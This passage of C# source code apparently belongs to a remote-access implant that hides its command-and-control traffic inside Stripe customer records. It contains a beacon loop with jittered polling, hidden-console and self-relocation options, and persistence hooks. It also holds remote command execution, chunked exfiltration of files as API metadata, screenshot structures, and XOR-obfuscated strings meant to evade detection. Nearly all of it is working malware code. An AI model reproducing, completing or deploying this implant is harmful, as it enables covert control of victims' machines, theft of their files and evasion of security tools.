            chunks.Add(b64.Substring(i, Math.Min(CHUNK_SIZE, b64.Length - i)));

        int totalObjects = (int)Math.Ceiling((double)chunks.Count / DATA_FIELDS);
        Console.WriteLine($"    {fileBytes.Length:N0} bytes  |  {totalObjects} segment(s)");

        int    dlSent = 0;
        var    sem    = new SemaphoreSlim(8);
        PrintProgress(0, totalObjects);

        await Task.WhenAll(Enumerable.Range(0, totalObjects).Select(async seg =>
        {
            await sem.WaitAsync();
            try
            {
                int start = seg * DATA_FIELDS;
                var group = chunks.GetRange(start, Math.Min(DATA_FIELDS, chunks.Count - start));

                var fields = new Dictionary<string, string>
                {
                    ["name"]                   = $"xfer-{xferId}-{seg}",
                    ["metadata[tag]"]          = EncryptedStrings.S_XFER_DOWNLOAD_DATA,
                    ["metadata[implant]"]      = implantId,
                    ["metadata[xfer_id]"]      = xferId,
                    ["metadata[seq]"]          = seg.ToString(),
                    ["metadata[local_chunks]"] = group.Count.ToString()
                };
                for (int i = 0; i < group.Count; i++)
                    fields[$"metadata[r{i}]"] = group[i];

                await CreateAsync(http, fields);
                PrintProgress(Interlocked.Increment(ref dlSent), totalObjects);
            }
            finally { sem.Release(); }
        }));

        Console.WriteLine();

        await UpdateAsync(http, reqId, new()
        {
            ["metadata[tag]"]           = EncryptedStrings.S_XFER_DOWNLOAD_DONE,
            ["metadata[total_objects]"] = totalObjects.ToString()
        });

        Console.WriteLine($"[+] Download complete: {remotePath}");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[-] Download exception: {ex.Message}");
        try { await UpdateAsync(http, reqId, new()
        {
            ["metadata[tag]"]   = EncryptedStrings.S_XFER_DOWNLOAD_ERROR,
            ["metadata[error]"] = ex.Message
        }); } catch { }
    }
}

// ============================================
// BEACON LOOP
// ============================================
string   implantId      = GetImplantId();
string   cwd            = Directory.GetCurrentDirectory();
string?  heartbeatObjId = null;
DateTime lastHeartbeat  = DateTime.MinValue;
int      nextHeartbeatS = GetJitteredDelay(HEARTBEAT_MIN_S, HEARTBEAT_MAX_S);

#if HIDE_CONSOLE
// Relocate first — if we moved, exit so the new instance takes over
if (RelocateSelf()) Environment.Exit(0);

HideConsoleWindow();
var logPath = Path.Combine(Path.GetTempPath(), $"implant_{implantId}.log");
var logFile = new StreamWriter(logPath, append: true) { AutoFlush = true };
Console.SetOut(logFile);
Console.SetError(logFile);
#endif

#if PERSIST_REGISTRY || PERSIST_STARTUP || PERSIST_TASK
InstallPersistence();
#endif

Console.WriteLine($"[*] Beacon started | implant={implantId} | os={Environment.OSVersion.Platform}");

using var http = BuildClient();

while (true)
{
    try
    {
        // ── Heartbeat ──────────────────────────────────────────────────────
        if ((DateTime.UtcNow - lastHeartbeat).TotalSeconds >= nextHeartbeatS)
        {
            // Find own heartbeat object using search (avoids full list scan)
            if (heartbeatObjId == null)
            {
                string enc = Uri.EscapeDataString($"{EncryptedStrings.S_HEARTBEAT}-{implantId}");
                using var sr = await http.GetAsync($"/v1/customers/search?query=name%3A%22{enc}%22&limit=10");
                var sdoc = JsonDocument.Parse(await sr.Content.ReadAsStringAsync()).RootElement;
                if (sdoc.TryGetProperty("data", out var sdata))
                    foreach (var el in sdata.EnumerateArray())
                    {
                        var m = GetMeta(el);
                        if (m.GetValueOrDefault("implant") == implantId)
                        { heartbeatObjId = GetId(el); break; }
                    }
            }

            await RegisterAsync(http, implantId, heartbeatObjId);

            // Cache ID after first creation (search again if still null)
            if (heartbeatObjId == null)
            {
                string enc = Uri.EscapeDataString($"{EncryptedStrings.S_HEARTBEAT}-{implantId}");
                using var sr = await http.GetAsync($"/v1/customers/search?query=name%3A%22{enc}%22&limit=10");
                var sdoc = JsonDocument.Parse(await sr.Content.ReadAsStringAsync()).RootElement;
                if (sdoc.TryGetProperty("data", out var sdata))
                    foreach (var el in sdata.EnumerateArray())
                    {
                        var m = GetMeta(el);
                        if (m.GetValueOrDefault("implant") == implantId)
                        { heartbeatObjId = GetId(el); break; }
                    }
            }

            lastHeartbeat  = DateTime.UtcNow;
            nextHeartbeatS = GetJitteredDelay(HEARTBEAT_MIN_S, HEARTBEAT_MAX_S);
        }

        // ── Poll ───────────────────────────────────────────────────────────
        // Primary path: check heartbeat object for queued task ID — O(1), no scanning
        if (heartbeatObjId != null)
        {
            var hb      = await FetchAsync(http, heartbeatObjId);
            var hbMeta  = GetMeta(hb);
            
#if ALLOW_DYNAMIC_CONFIG
            // Check for dynamic configuration updates from operator
            ApplyDynamicConfig(hbMeta);
#endif
            
            string? pendingId = hbMeta.GetValueOrDefault("pending_cmd");

            if (!string.IsNullOrEmpty(pendingId))
            {
                // Clear the pointer immediately so we don't double-process
                await UpdateAsync(http, heartbeatObjId, new() { ["metadata[pending_cmd]"] = "" });

                try
                {
                    var    task     = await FetchAsync(http, pendingId);
                    var    taskMeta = GetMeta(task);
                    string tag      = taskMeta.GetValueOrDefault("tag", "");

                    if (tag == EncryptedStrings.S_C2_PENDING && taskMeta.GetValueOrDefault("implant") == implantId)
                    {
                        await UpdateAsync(http, pendingId, new() { ["metadata[tag]"] = EncryptedStrings.S_C2_PROCESSING });

                        string cmdB64 = taskMeta["cmd"];
                        string cmd    = Encoding.UTF8.GetString(Convert.FromBase64String(cmdB64));
                        Console.WriteLine($"[*] Received command: {cmd}");

                        bool   isBinary = false;
                        byte[] result = ExecuteCommand(cmd, ref cwd, ref isBinary);
                        await WriteResultAsync(http, pendingId, cmdB64, result, cwd, implantId, isBinary);
                        Console.WriteLine($"[+] Result sent | cwd={cwd}");
                    }
                    else if (tag == EncryptedStrings.S_XFER_UPLOAD_CTRL && taskMeta.GetValueOrDefault("implant") == implantId)
                        await HandleUploadAsync(http, pendingId, taskMeta, implantId);
                    else if (tag == EncryptedStrings.S_XFER_DOWNLOAD_REQ && taskMeta.GetValueOrDefault("implant") == implantId)
                        await HandleDownloadAsync(http, pendingId, taskMeta, implantId);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Task fetch error: {ex.Message}");
                }
            }
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[-] Beacon error: {ex.GetType().Name}: {ex.Message}");
    }

    // Jittered poll interval to avoid predictable network patterns
    int pollDelay = GetJitteredDelay(POLL_MIN_MS, POLL_MAX_MS);
    await Task.Delay(pollDelay);
}

// ============================================
// IMPLANT ID  (defined after top-level statements per C# top-level rules)
// ============================================
string GetImplantId()
{
    string raw  = $"{Environment.MachineName}-{Environment.OSVersion.Platform}";
    byte[] hash = MD5.HashData(Encoding.UTF8.GetBytes(raw));
    return $"{Environment.MachineName}-{Convert.ToHexString(hash)[..8].ToLower()}";
}

// ============================================
// SUPPORT CLASSES
// ============================================

// ============================================
// Encrypts strings at compile time to avoid plaintext in binary
// Key derived from build timestamp + machine info (changes per build)

static class Crypto
{
    // ============================================================
    // *** CRITICAL: THIS FILE CANNOT BE COMPILED AS-IS ***
    // 
    // Before building, you MUST run: python3 regenerate_key.py
    // 
    // This will:
    // 1. Generate a random XOR encryption key
    // 2. Encrypt your Stripe API key and protocol strings
    // 3. Replace all the placeholder bytes below
    // 
    // DO NOT commit Implant.cs after running regenerate_key.py!
    // The GitHub version should always have these placeholder zeros.
    // ============================================================
    
    // XOR key - PLACEHOLDER - will be replaced by regenerate_key.py
    private static readonly byte[] Key = new byte[] 
    { 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    public static string Decrypt(byte[] encrypted)
    {
        var decrypted = new byte[encrypted.Length];
        for (int i = 0; i < encrypted.Length; i++)
            decrypted[i] = (byte)(encrypted[i] ^ Key[i % Key.Length]);
        return Encoding.UTF8.GetString(decrypted);
    }

    public static byte[] Encrypt(string plaintext)
    {
        var bytes = Encoding.UTF8.GetBytes(plaintext);
        var encrypted = new byte[bytes.Length];
        for (int i = 0; i < bytes.Length; i++)
            encrypted[i] = (byte)(bytes[i] ^ Key[i % Key.Length]);
        return encrypted;
    }
}

// ============================================
// ENCRYPTED STRINGS
// ============================================
static class EncryptedStrings
{
    // ============================================================
    // *** PLACEHOLDER VALUES - MUST RUN regenerate_key.py ***
    // 
    // These arrays are filled with zeros as placeholders.
    // Run: python3 regenerate_key.py
    // 
    // This will replace all these arrays with properly encrypted
    // versions of your API key and protocol strings.
    // ============================================================
    
    // API Key - PLACEHOLDER (106 bytes for typical Stripe key)
    public static readonly byte[] ENC_API_KEY = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string API_KEY => Crypto.Decrypt(ENC_API_KEY);

    // Protocol strings - PLACEHOLDERS
    public static readonly byte[] ENC_HEARTBEAT = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_HEARTBEAT => Crypto.Decrypt(ENC_HEARTBEAT);
    public static readonly byte[] ENC_C2_PENDING = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_C2_PENDING => Crypto.Decrypt(ENC_C2_PENDING);
    public static readonly byte[] ENC_C2_PROCESSING = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_C2_PROCESSING => Crypto.Decrypt(ENC_C2_PROCESSING);
    public static readonly byte[] ENC_C2_DONE = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_C2_DONE => Crypto.Decrypt(ENC_C2_DONE);
    public static readonly byte[] ENC_XFER_UPLOAD_CTRL = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_UPLOAD_CTRL => Crypto.Decrypt(ENC_XFER_UPLOAD_CTRL);
    public static readonly byte[] ENC_XFER_UPLOAD_PROCESSING = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_UPLOAD_PROCESSING => Crypto.Decrypt(ENC_XFER_UPLOAD_PROCESSING);
    public static readonly byte[] ENC_XFER_UPLOAD_IDX = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_UPLOAD_IDX => Crypto.Decrypt(ENC_XFER_UPLOAD_IDX);
    public static readonly byte[] ENC_XFER_UPLOAD_DATA = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_UPLOAD_DATA => Crypto.Decrypt(ENC_XFER_UPLOAD_DATA);
    public static readonly byte[] ENC_XFER_DOWNLOAD_REQ = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_DOWNLOAD_REQ => Crypto.Decrypt(ENC_XFER_DOWNLOAD_REQ);
    public static readonly byte[] ENC_XFER_DOWNLOAD_PROCESSING = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_DOWNLOAD_PROCESSING => Crypto.Decrypt(ENC_XFER_DOWNLOAD_PROCESSING);
    public static readonly byte[] ENC_XFER_DOWNLOAD_DONE = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_DOWNLOAD_DONE => Crypto.Decrypt(ENC_XFER_DOWNLOAD_DONE);
    public static readonly byte[] ENC_XFER_DOWNLOAD_ERROR = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_DOWNLOAD_ERROR => Crypto.Decrypt(ENC_XFER_DOWNLOAD_ERROR);
    public static readonly byte[] ENC_XFER_DOWNLOAD_DATA = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_XFER_DOWNLOAD_DATA => Crypto.Decrypt(ENC_XFER_DOWNLOAD_DATA);
    public static readonly byte[] ENC_PENDING_CMD = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_PENDING_CMD => Crypto.Decrypt(ENC_PENDING_CMD);
    public static readonly byte[] ENC_IMPLANT = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    public static string S_IMPLANT => Crypto.Decrypt(ENC_IMPLANT);
    public static readonly byte[] ENC_TAG = new byte[] { 0x00, 0x00, 0x00 };
    public static string S_TAG => Crypto.Decrypt(ENC_TAG);
    public static readonly byte[] ENC_TYPE = new byte[] { 0x00, 0x00, 0x00, 0x00 };
public static string S_TYPE => Crypto.Decrypt(ENC_TYPE);
}

// ── GDI+ / screenshot structs ─────────────────────────────────────────────────
[StructLayout(LayoutKind.Sequential)]
struct GdiplusStartupInput
{
    public uint  GdiplusVersion;
    public IntPtr DebugEventCallback;
    public int   SuppressBackgroundThread; // int not bool — avoids marshal mismatch
    public int   SuppressExternalCodecs;
}

[StructLayout(LayoutKind.Sequential)]
struct BITMAPINFOHEADER { public uint biSize; public int biWidth, biHeight; public ushort biPlanes, biBitCount; public uint biCompression, biSizeImage, biXPpm, biYPpm, biClrUsed, biClrImportant; }

[StructLayout(LayoutKind.Sequential)]
struct BITMAPINFO { public BITMAPINFOHEADER bmiHeader; public uint bmiColors; }

[StructLayout(LayoutKind.Sequential)]
struct EncoderParameter { public Guid Guid; public uint NumberOfValues; public uint Type; public IntPtr Value; }

[StructLayout(LayoutKind.Sequential)]
struct EncoderParameters { public uint Count; public EncoderParameter Parameter; }

